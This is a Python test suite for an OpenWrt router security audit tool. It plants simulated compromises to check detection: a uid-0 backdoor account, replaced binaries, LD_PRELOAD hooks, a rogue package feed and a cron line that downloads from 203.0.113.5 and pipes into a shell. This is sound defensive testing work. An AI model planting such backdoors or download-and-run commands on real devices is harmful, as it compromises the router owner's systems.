"""audit: the clean baseline, a planted infection, and every check on its own.

The fixtures come from test_forensics: the firmware image is a copy of the container's
system tree, the overlay's upper directory is built by hand on a tmpfs.

Processes: in these emulated containers every /proc/PID/exe points at the emulator, so
the process checks are fed a hand-made process tree through MCP_PROC. Sockets are real:
the listener is a uhttpd started in the container.
"""

import re
import unittest

import mcp_client
from mcp_client import OpenWrtTestCase
from test_forensics import ED_BLOB, ED_LINE, MAKE_ROM, MAKE_UPPER, ROM_DIR, UPPER_DIR, fingerprint

PROC_DIR = "/fixture/proc"
ROM = {"MCP_ROM": ROM_DIR}
BOTH = {"MCP_ROM": ROM_DIR, "MCP_UPPER": UPPER_DIR}
FULL = {"MCP_ROM": ROM_DIR, "MCP_UPPER": UPPER_DIR, "MCP_PROC": PROC_DIR}

# what an untouched rootfs container may report: OpenWrt ships without a root password,
# and the images under test are old releases
BASELINE = {"auth.root_no_password", "updates.branch_eol", "updates.firmware_age"}
EOL = ("21.02", "22.03", "23.05")
BRANCH = re.search(r"(\d+\.\d+)\.\d+", mcp_client.IMAGE)
BRANCH = BRANCH.group(1) if BRANCH else ""

WAN_ZONE = r"""z=$(uci show firewall | sed -n "s/^\(firewall\.@zone\[[0-9]*\]\)\.name='wan'$/\1/p")"""
SET_ROOT_PW = r"""sed -i 's|^root:[^:]*:|root:$6$salt$Um9vdEhhc2hSb290SGFzaA:|' /etc/shadow"""


def findings(text):
    """id -> (severity, the indented block under the heading)"""
    out = {}
    for m in re.finditer(r"^\[(HIGH|MEDIUM|LOW|INFO)\] (\S+): .*\n((?:  .*\n)+)", text, flags=re.M):
        out[m.group(2)] = (m.group(1), m.group(3))
    return out


class AuditCase(OpenWrtTestCase):
    SETUP = ""

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        if cls.container is None:
            raise unittest.SkipTest("needs a container")
        try:
            cls.container.sh(MAKE_ROM)
            if cls.SETUP:
                cls.container.sh(cls.SETUP)
        except BaseException:
            cls.tearDownClass()
            raise

    def audit(self, env=None, **args):
        text = self.tool_ok("audit", env, **args)
        return text, findings(text)

    def assertFinding(self, found, check, severity, *evidence):
        self.assertIn(check, found, f"missing {check}; found {sorted(found)}")
        self.assertEqual(found[check][0], severity, check)
        for e in evidence:
            self.assertIn(e, found[check][1], check)


class TestAuditClean(AuditCase):
    def check_baseline(self, found):
        self.assertLessEqual(set(found), BASELINE, f"false alarms: {sorted(set(found) - BASELINE)}")
        self.assertEqual(found["auth.root_no_password"][0], "HIGH")
        self.assertEqual("updates.branch_eol" in found, BRANCH in EOL)

    def test_untouched_container(self):
        text, found = self.audit()
        self.check_baseline(found)
        tail = text.split("== Could not check")[1]
        self.assertIn("integrity.image_file_replaced", tail)
        self.assertIn("no overlay upper directory found", tail)
        self.assertIn("persistence.autostart_added", tail)
        self.assertIn("trusted tools", tail)
        self.assertIn("kernel rootkit", tail)
        self.assertIn("firmware image: /rom (not usable) | overlay: none found", text)
        clean = text.split("== Checked, nothing found")[1].split("==")[0]
        for check in ("exposure.wan_input_accept", "auth.extra_uid0", "integrity.tmp_executable",
                      "integrity.ld_preload", "persistence.user_autostart"):
            self.assertIn(check, clean)

    def test_image_and_empty_overlay_raise_no_alarm(self):
        self.sh("mkdir -p /dev/shm/empty-upper")
        text, found = self.audit({"MCP_ROM": ROM_DIR, "MCP_UPPER": "/dev/shm/empty-upper"})
        self.check_baseline(found)
        tail = text.split("== Could not check")[1]
        self.assertNotIn("integrity.image_file_replaced", tail)
        self.assertNotIn("persistence.autostart_added", tail)
        self.assertNotIn("trusted tools", tail)  # the image copy has a busybox
        self.assertIn(f"firmware image: {ROM_DIR} (usable) | overlay: /dev/shm/empty-upper", text)

    def test_finding_layout(self):
        text, found = self.audit()
        block = found["auth.root_no_password"][1]
        self.assertRegex(block, r"  confidence: high")
        self.assertIn("  evidence:\n    - /etc/shadow: root has an empty password field", block)
        self.assertRegex(block, r"  why: \S")
        self.assertRegex(block, r"  do: \S")
        self.assertRegex(text, r"findings: 1 high, \d medium, \d low, 0 info")

    def test_category_and_severity_filters(self):
        text, found = self.audit(categories=["wifi", "updates"])
        self.assertNotIn("auth.root_no_password", found)
        self.assertIn("categories: wifi updates", text)
        self.assertNotIn("exposure.", text)
        text, found = self.audit(min_severity="high")
        self.assertEqual(set(found), {"auth.root_no_password"})
        self.assertIn("(shown: high and above)", text)
        text, err = self.tool("audit", categories=["wifi", "nope"])
        self.assertTrue(err)
        self.assertIn("unknown category 'nope'", text)
        text, err = self.tool("audit", min_severity="critical")
        self.assertTrue(err)


class TestAuditInfected(AuditCase):
    """The six plants of the brief; each must show up once, and nothing else."""

    SETUP = rf"""
set -e
{SET_ROOT_PW}
mkdir -p {UPPER_DIR}/usr/bin
cp /bin/busybox {UPPER_DIR}/usr/bin/jshn
echo '*/10 * * * * /usr/bin/update-check' > /etc/crontabs/root
echo 'toor:x:0:0::/root:/bin/ash' >> /etc/passwd
echo 'toor:$1$saltsalt$Qm9ndXNIYXNoQm9ndXNIYXNo:19700:0:99999:7:::' >> /etc/shadow
mkdir -p {PROC_DIR}/4242
ln -s '/tmp/.cache/kworkerd (deleted)' {PROC_DIR}/4242/exe
printf 'kworkerd\000--daemon\000' > {PROC_DIR}/4242/cmdline
echo kworkerd > {PROC_DIR}/4242/comm
: > {PROC_DIR}/4242/environ
{WAN_ZONE}
uci set "$z.input=ACCEPT"
uci commit firewall
(uhttpd -f -p 0.0.0.0:18099 -h /www >/dev/null 2>&1 &)
mkdir -p /etc/dropbear
cat > /etc/dropbear/authorized_keys <<'EOF'
{ED_LINE}
EOF
sleep 1
"""

    def test_each_plant_once_and_nothing_else(self):
        text, found = self.audit(FULL)
        self.assertFinding(found, "integrity.image_file_replaced", "HIGH", "/usr/bin/jshn: ",
                           "package jshn (image)", "image: ")
        self.assertFinding(found, "persistence.user_autostart", "LOW",
                           "/etc/crontabs/root line 1: */10 * * * * /usr/bin/update-check")
        self.assertFinding(found, "auth.extra_uid0", "HIGH",
                           "/etc/passwd: account 'toor' has uid 0, shell /bin/ash, password set, md5crypt, "
                           "not in the firmware image")
        self.assertFinding(found, "integrity.process_deleted_tmp_binary", "HIGH",
                           "pid 4242 (kworkerd): /tmp/.cache/kworkerd (deleted); command line: kworkerd --daemon")
        self.assertFinding(found, "exposure.wan_input_accept", "HIGH", "zone 'wan'", "input=ACCEPT",
                           "reachable: tcp 0.0.0.0:18099 pid ", "(uhttpd)")
        self.assertFinding(found, "auth.authorized_keys", "LOW", fingerprint(ED_BLOB), "admin@laptop",
                           "[not in the image]")
        plants = {"integrity.image_file_replaced", "persistence.user_autostart", "auth.extra_uid0",
                  "integrity.process_deleted_tmp_binary", "exposure.wan_input_accept", "auth.authorized_keys"}
        extra = set(found) - plants - (BASELINE - {"auth.root_no_password"})
        self.assertFalse(extra, f"flagged besides the plants: {sorted(extra)}")
        for needle in ("/usr/bin/jshn", "toor", ":18099", "4242", fingerprint(ED_BLOB), "update-check"):
            self.assertEqual(text.count(needle), 1, needle)

    def test_ordered_by_severity(self):
        text, _ = self.audit(FULL)
        sev = re.findall(r"^\[(HIGH|MEDIUM|LOW|INFO)\] ", text, flags=re.M)
        rank = [("HIGH", "MEDIUM", "LOW", "INFO").index(s) for s in sev]
        self.assertEqual(rank, sorted(rank))
        self.assertEqual(sev[0], "HIGH")
        self.assertLess(text.index("[HIGH]"), text.index("== Checked, nothing found"))
        self.assertLess(text.index("== Checked, nothing found"), text.index("== Could not check"))

    def test_no_secret_in_the_output(self):
        for env in (FULL, dict(FULL, MCP_REDACT="0")):
            text, _ = self.audit(env)
            self.assertNotIn("Qm9ndXNIYXNoQm9ndXNIYXNo", text)
            self.assertNotIn("Um9vdEhhc2hSb290SGFzaA", text)

    def test_filters_keep_the_evidence(self):
        text, found = self.audit(FULL, categories=["auth"])
        self.assertEqual({f.split(".")[0] for f in found}, {"auth"})
        self.assertIn("auth.extra_uid0", found)
        text, found = self.audit(FULL, min_severity="high")
        self.assertNotIn("auth.authorized_keys", found)
        self.assertIn("integrity.image_file_replaced", found)
        self.assertRegex(text, r"findings: \d high, \d medium, [1-9] low")  # counted, not shown


class TestAuditExposureAuth(AuditCase):
    SETUP = rf"""
set -e
{SET_ROOT_PW}
uci add firewall rule >/dev/null
uci set firewall.@rule[-1].name='Allow-SSH-WAN'
uci set firewall.@rule[-1].src='wan'
uci set firewall.@rule[-1].proto='tcp'
uci set firewall.@rule[-1].dest_port='20-25'
uci set firewall.@rule[-1].target='ACCEPT'
uci add firewall rule >/dev/null
uci set firewall.@rule[-1].name='Off'
uci set firewall.@rule[-1].src='wan'
uci set firewall.@rule[-1].proto='tcp'
uci set firewall.@rule[-1].dest_port='18081'
uci set firewall.@rule[-1].target='ACCEPT'
uci set firewall.@rule[-1].enabled='0'
uci add firewall redirect >/dev/null
uci set firewall.@redirect[-1].name='camera'
uci set firewall.@redirect[-1].src='wan'
uci set firewall.@redirect[-1].src_dport='8554'
uci set firewall.@redirect[-1].dest='lan'
uci set firewall.@redirect[-1].dest_ip='192.168.1.50'
uci commit firewall
(uhttpd -f -p 0.0.0.0:22 -h /www >/dev/null 2>&1 &)
(uhttpd -f -p 0.0.0.0:18081 -h /www >/dev/null 2>&1 &)
(uhttpd -f -p 127.0.0.1:21 -h /www >/dev/null 2>&1 &)
echo 'guest:x:1000:1000::/home/guest:/bin/ash' >> /etc/passwd
echo 'guest::19700:0:99999:7:::' >> /etc/shadow
echo 'admin2:x:1001:1001::/home/admin2:/bin/ash' >> /etc/passwd
echo 'admin2:$6$salt$QWRtaW4ySGFzaA:19700:0:99999:7:::' >> /etc/shadow
echo 'svc:x:1002:1002::/var:/bin/false' >> /etc/passwd
echo 'svc:x:0:0:99999:7:::' >> /etc/shadow
sleep 1
"""

    def test_rule_opens_port_and_ssh_password_login(self):
        text, found = self.audit(ROM, categories=["exposure", "auth"])
        self.assertFinding(found, "exposure.wan_open_port", "MEDIUM", "tcp 0.0.0.0:22 pid ",
                           "<- rule 'Allow-SSH-WAN'", "dest_port=20-25")
        block = found["exposure.wan_open_port"][1]
        self.assertNotIn(":18081", block)  # its rule is disabled
        self.assertNotIn("127.0.0.1", block)  # loopback listener, port 21 in range
        self.assertNotIn("exposure.wan_input_accept", found)
        self.assertRegex(block, r"confidence: medium: read from /etc/config/firewall")
        self.assertFinding(found, "auth.ssh_password_from_wan", "HIGH", "password login on, port 22",
                           "tcp 0.0.0.0:22", "Allow-SSH-WAN")
        self.assertFinding(found, "exposure.port_forward", "LOW", "redirect 'camera'", "port 8554 -> 192.168.1.50:8554")

    def test_key_only_ssh_is_not_flagged(self):
        sec = self.sh("uci show dropbear | sed -n 's/=dropbear$//p' | head -n 1").strip()
        self.sh(f"uci set {sec}.PasswordAuth=off && uci commit dropbear")
        try:
            _, found = self.audit(ROM, categories=["exposure", "auth"])
            self.assertNotIn("auth.ssh_password_from_wan", found)
            self.assertIn("exposure.wan_open_port", found)
        finally:
            self.sh(f"uci set {sec}.PasswordAuth=on && uci commit dropbear")

    def test_accounts(self):
        _, found = self.audit(ROM, categories=["auth"])
        self.assertFinding(found, "auth.empty_password", "MEDIUM", "account 'guest' (uid 1000, shell /bin/ash)")
        self.assertFinding(found, "auth.account_added", "LOW", "account 'admin2'", "password set, sha512crypt")
        self.assertNotIn("svc", found["auth.account_added"][1])  # no login shell
        self.assertNotIn("auth.root_no_password", found)
        self.assertNotIn("auth.extra_uid0", found)

    def test_ubus_without_login(self):
        self.sh("uci set uhttpd.main.no_ubusauth=1 && uci commit uhttpd")
        try:
            _, found = self.audit(ROM, categories=["auth"])
            self.assertFinding(found, "auth.ubus_without_login", "HIGH", "uhttpd.main.no_ubusauth='1'")
        finally:
            self.sh("uci delete uhttpd.main.no_ubusauth && uci commit uhttpd")


class TestAuditIntegrity(AuditCase):
    SETUP = MAKE_UPPER + rf"""
mkdir -p {PROC_DIR}/100 {PROC_DIR}/101 {PROC_DIR}/102 {PROC_DIR}/103 {PROC_DIR}/104 /tmp/run
printf '#!/bin/sh\n' > /tmp/run/payload && chmod 755 /tmp/run/payload
echo data > /tmp/run/notes
cp /bin/busybox /usr/bin/planted
ln -s /tmp/run/payload {PROC_DIR}/100/exe
ln -s /usr/bin/planted {PROC_DIR}/101/exe
ln -s '/usr/sbin/dnsmasq (deleted)' {PROC_DIR}/102/exe
ln -s /bin/busybox {PROC_DIR}/103/exe
ln -s /usr/bin/qemu-nowhere {PROC_DIR}/104/exe
for p in 100 101 102 103 104; do echo "proc$p" > {PROC_DIR}/$p/comm; printf 'cmd%s\000-x\000' $p > {PROC_DIR}/$p/cmdline; : > {PROC_DIR}/$p/environ; done
printf 'HOME=/\000LD_PRELOAD=/tmp/run/libhook.so\000' > {PROC_DIR}/103/environ
"""

    def test_overlay_checks(self):
        text, found = self.audit(FULL, categories=["integrity"])
        self.assertFinding(found, "integrity.image_file_replaced", "HIGH", "/usr/bin/jshn")
        self.assertFinding(found, "integrity.setuid_added", "HIGH", "/bin/ubus: ", "mode 4755", "image: mode 0755")
        self.assertFinding(found, "integrity.unowned_program", "MEDIUM", "/usr/bin/gl-helper")
        block = found["integrity.unowned_program"][1]
        self.assertNotIn("notes.txt", block)  # not executable: priority 3, no finding
        self.assertNotIn("gl_helper", block)  # an autostart entry: the persistence checks own it
        self.assertNotIn("/etc/config/firewall", text)
        self.assertNotIn("/etc/passwd", text)
        if "/usr/sbin/uhttpd" in self.tool_ok("overlay_diff", BOTH, status="deleted"):
            self.assertFinding(found, "integrity.image_file_deleted", "LOW", "/usr/sbin/uhttpd: deleted in the overlay")
            self.assertNotIn("uci-defaults", found["integrity.image_file_deleted"][1])

    def test_tmp_executables(self):
        _, found = self.audit(FULL, categories=["integrity"])
        self.assertFinding(found, "integrity.tmp_executable", "MEDIUM", "/tmp/run/payload: script (#!/bin/sh)")
        block = found["integrity.tmp_executable"][1]
        self.assertNotIn("/tmp/run/notes", block)
        self.assertNotIn(UPPER_DIR, block)  # the overlay under inspection is not "the RAM disk"
        self.assertNotIn("openwrt-mcp", block)

    def test_processes(self):
        text, found = self.audit(FULL, categories=["integrity"])
        self.assertFinding(found, "integrity.process_tmp_binary", "MEDIUM",
                           "pid 100 (proc100): /tmp/run/payload; command line: cmd100 -x")
        self.assertFinding(found, "integrity.process_not_from_image", "MEDIUM",
                           "pid 101 (proc101): /usr/bin/planted is not in the firmware image; no package owns it")
        self.assertFinding(found, "integrity.process_deleted_binary", "MEDIUM",
                           "pid 102 (proc102): /usr/sbin/dnsmasq (deleted)")
        self.assertNotIn("integrity.process_deleted_tmp_binary", found)
        self.assertEqual(text.count("pid 103"), 1)  # busybox from the image: only the preload finding
        self.assertRegex(text, r"1 processes point at a program path that does not exist")
        self.assertNotIn("pid 104", text)

    def test_preload(self):
        _, found = self.audit(FULL, categories=["integrity"])
        self.assertFinding(found, "integrity.ld_preload", "HIGH",
                           "pid 103 (proc103): environment has LD_PRELOAD=/tmp/run/libhook.so")
        self.sh("printf '# x\\n/usr/lib/libhide.so\\n' > /etc/ld.so.preload")
        try:
            _, found = self.audit(BOTH, categories=["integrity"])  # real /proc: only the file
            self.assertFinding(found, "integrity.ld_preload", "MEDIUM", "/etc/ld.so.preload line 2: /usr/lib/libhide.so")
        finally:
            self.sh("rm -f /etc/ld.so.preload")
        _, found = self.audit(BOTH, categories=["integrity"])
        self.assertNotIn("integrity.ld_preload", found)

    def test_kernel_modules(self):
        mods = self.sh("awk '{ print $1 }' /proc/modules").split()
        if len(mods) < 2:
            self.skipTest("this kernel lists fewer than two modules")
        rel = self.sh("uname -r").strip()
        _, found = self.audit(BOTH, categories=["integrity"])
        self.assertNotIn("integrity.kernel_module_not_in_image", found)
        # the image knows every loaded module but the first one
        self.sh(f"mkdir -p {ROM_DIR}/lib/modules/{rel}/sub && cd {ROM_DIR}/lib/modules/{rel} && "
                + " && ".join(f": > sub/{m.replace('_', '-')}.ko" for m in mods[1:]))
        try:
            text, found = self.audit(BOTH, categories=["integrity"])
            self.assertFinding(found, "integrity.kernel_module_not_in_image", "MEDIUM",
                               f"module {mods[0]} (", f"no {mods[0]}.ko in the image")
            self.assertEqual(found["integrity.kernel_module_not_in_image"][1].count("    - module "), 1)
        finally:
            self.sh(f"rm -rf {ROM_DIR}/lib/modules/{rel}")

    def test_without_overlay_the_checks_are_listed_as_skipped(self):
        text, found = self.audit(ROM, categories=["integrity"])
        self.assertNotIn("integrity.image_file_replaced", found)
        self.assertRegex(text.split("== Could not check")[1],
                         r"integrity\.image_file_replaced, .*: no overlay upper directory found")


class TestAuditPersistenceUpdatesWifi(AuditCase):
    SETUP = rf"""
set -e
{SET_ROOT_PW}
echo '/bin/ulogd &' >> /etc/init.d/urandom_seed
mkdir -p /etc/hotplug.d/iface
printf '#!/bin/sh\n/tmp/.cache/up\n' > /etc/hotplug.d/iface/99-up
ln -s ../init.d/dnsmasq /etc/rc.d/S99again
echo '*/5 * * * * wget -qO- http://203.0.113.5/x?token=crontoken9 | sh' > /etc/crontabs/root
printf '# comment\n/usr/bin/ddns-update\nexit 0\n' > /etc/rc.local
echo 'src/gz evil http://203.0.113.9/packages' >> /etc/opkg/customfeeds.conf 2>/dev/null || echo 'http://203.0.113.9/packages' >> /etc/apk/repositories.d/customfeeds.list
cat > /etc/config/wireless <<'EOF'
config wifi-device 'radio0'
	option type 'mac80211'
config wifi-device 'radio1'
	option type 'mac80211'
	option disabled '1'
config wifi-iface 'main'
	option device 'radio0'
	option mode 'ap'
	option ssid 'Home'
	option encryption 'psk-mixed'
	option key 'supersecretwifi'
	option wps_pushbutton '1'
config wifi-iface 'guest'
	option device 'radio0'
	option mode 'ap'
	option ssid 'Guest'
	option encryption 'none'
config wifi-iface 'old'
	option device 'radio0'
	option ssid 'Old'
	option encryption 'wep-open'
	option key '1'
	option key1 'wepkey12345'
config wifi-iface 'good'
	option device 'radio0'
	option ssid 'Good'
	option encryption 'sae-mixed'
	option key 'anothersecretkey'
config wifi-iface 'off'
	option device 'radio0'
	option ssid 'Off'
	option encryption 'none'
	option disabled '1'
config wifi-iface 'offradio'
	option device 'radio1'
	option ssid 'OffRadio'
	option encryption 'none'
config wifi-iface 'uplink'
	option device 'radio0'
	option mode 'sta'
	option ssid 'Hotel'
	option encryption 'none'
EOF
"""

    def test_persistence(self):
        text, found = self.audit(ROM, categories=["persistence"])
        self.assertFinding(found, "persistence.image_script_changed", "HIGH", "/etc/init.d/urandom_seed: ",
                           "image: ", "package urandom-seed (image)")
        self.assertFinding(found, "persistence.autostart_added", "MEDIUM", "/etc/hotplug.d/iface/99-up: ",
                           "no package owns it")
        self.assertNotIn("S99again", text)  # a link to an image init script only enables a service
        self.assertFinding(found, "persistence.user_autostart", "MEDIUM",
                           "/etc/crontabs/root line 1: */5 * * * * wget -qO- http://203.0.113.5/x?token=<redacted> | sh"
                           "  <- downloads, pipes into a shell or uses the RAM disk",
                           "/etc/rc.local line 2: /usr/bin/ddns-update")
        self.assertNotIn("crontoken9", text)
        self.assertNotIn("exit 0", found["persistence.user_autostart"][1])
        self.assertFinding(found, "persistence.feeds_changed", "LOW", "customfeeds")

    def test_persistence_without_image(self):
        text, found = self.audit(categories=["persistence"])
        self.assertIn("persistence.user_autostart", found)  # needs no image
        self.assertNotIn("persistence.image_script_changed", found)
        self.assertRegex(text.split("== Could not check")[1], r"persistence\.image_script_changed, .*no usable firmware image")

    def test_wifi(self):
        text, found = self.audit(ROM, categories=["wifi"])
        self.assertFinding(found, "wifi.open_network", "MEDIUM", "wireless.guest (/etc/config/wireless): ssid 'Guest'")
        self.assertFinding(found, "wifi.wep", "HIGH", "ssid 'Old'", "encryption wep-open")
        self.assertFinding(found, "wifi.wpa1", "LOW", "ssid 'Home'", "psk-mixed (WPA1 still accepted)")
        self.assertFinding(found, "wifi.wps", "LOW", "ssid 'Home'", "WPS push button enabled")
        self.assertFinding(found, "wifi.open_uplink", "LOW", "ssid 'Hotel'", "mode sta")
        for absent in ("'Good'", "'Off'", "'OffRadio'", "supersecretwifi", "anothersecretkey", "wepkey12345"):
            self.assertNotIn(absent, text)

    def test_wifi_without_config(self):
        self.sh("mv /etc/config/wireless /tmp/wireless.bak")
        try:
            text, found = self.audit(ROM, categories=["wifi"])
            self.assertFalse(found)
            self.assertIn("no wireless configuration", text.split("== Could not check")[1])
        finally:
            self.sh("mv /tmp/wireless.bak /etc/config/wireless")

    def test_update_state(self):
        self.sh(f"cp -a /etc/openwrt_release /tmp/release.bak; cp -a {ROM_DIR}/etc/openwrt_release /tmp/release.rom")
        try:
            self.sh("""sed -i "s/^DISTRIB_RELEASE=.*/DISTRIB_RELEASE='19.07.10'/" /etc/openwrt_release""")
            self.sh(f"touch -d '2020-03-01 00:00:00' {ROM_DIR}/etc/openwrt_release")
            _, found = self.audit(ROM, categories=["updates"])
            self.assertFinding(found, "updates.branch_eol", "MEDIUM", "DISTRIB_RELEASE=19.07.10", "19.07 branch is end of life")
            self.assertFinding(found, "updates.firmware_age", "LOW", "is dated 2020-03-01", "release 19.07.10")
            # vendor firmware on an old branch: lower severity, other advice
            self.sh("echo 4.5.16 > /etc/glversion")
            text, found = self.audit(ROM, categories=["updates"])
            self.assertFinding(found, "updates.branch_eol", "LOW", "GL.iNet firmware 4.5.16", "backports fixes itself")
            self.assertIn("GL.iNet firmware 4.5.16", text.splitlines()[0])
            self.sh("rm -f /etc/glversion")
            # a current release, built today: nothing to report
            self.sh("""sed -i "s/^DISTRIB_RELEASE=.*/DISTRIB_RELEASE='99.01.0'/" /etc/openwrt_release""")
            self.sh(f"touch {ROM_DIR}/etc/openwrt_release")
            _, found = self.audit(ROM, categories=["updates"])
            self.assertFalse(found)
            self.sh("""sed -i "s/^DISTRIB_RELEASE=.*/DISTRIB_RELEASE='SNAPSHOT'/" /etc/openwrt_release""")
            text, found = self.audit(ROM, categories=["updates"])
            self.assertFalse(found)
            self.assertIn("snapshot build", text.split("== Could not check")[1])
        finally:
            self.sh(f"rm -f /etc/glversion; cp -a /tmp/release.bak /etc/openwrt_release; "
                    f"cp -a /tmp/release.rom {ROM_DIR}/etc/openwrt_release")


if __name__ == "__main__":
    unittest.main()
